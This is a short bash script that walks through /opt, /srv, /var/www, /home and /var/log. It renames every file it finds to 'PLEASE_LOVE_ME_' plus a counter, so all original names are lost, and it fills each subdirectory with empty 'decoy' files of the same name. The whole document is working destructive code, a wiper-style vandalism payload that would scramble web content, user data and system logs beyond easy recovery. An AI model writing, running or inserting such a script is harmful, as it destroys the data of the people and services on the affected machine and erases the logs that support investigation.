#!/bin/bash

TARGET_DIRS=(
    /opt
    /srv
    /var/www
    /home
    /var/log
)

# Global counter for unique file names
counter=1

rename_files() {
    local dir="$1"

    # Rename all existing files in this dir
    for file in "$dir"/*; do
        [ -f "$file" ] || continue
        mv "$file" "${file%/*}/PLEASE_LOVE_ME_${counter}"
        ((counter++))
    done

    # Recurse into subdirs
    for entry in "$dir"/*/; do
        [ -d "$entry" ] || continue
        rename_files "${entry%/}"
    done
}

create_files() {
    local dir="$1"

    # Create 20 files in each subdir
    for entry in "$dir"/*/; do
        [ -d "$entry" ] || continue
        for i in {1..20}; do
            > "${entry%/}/PLEASE_LOVE_ME_${i}"
        done
        # Recurse
        create_files "${entry%/}"
    done
}

cd /

for target in "${TARGET_DIRS[@]}"; do
    [ -d "$target" ] || { echo "[SKIP] $target not found"; continue; }
    echo "[*] Renaming files in $target"
    rename_files "$target"
    echo "[*] Creating decoy files in $target"
    create_files "$target"
done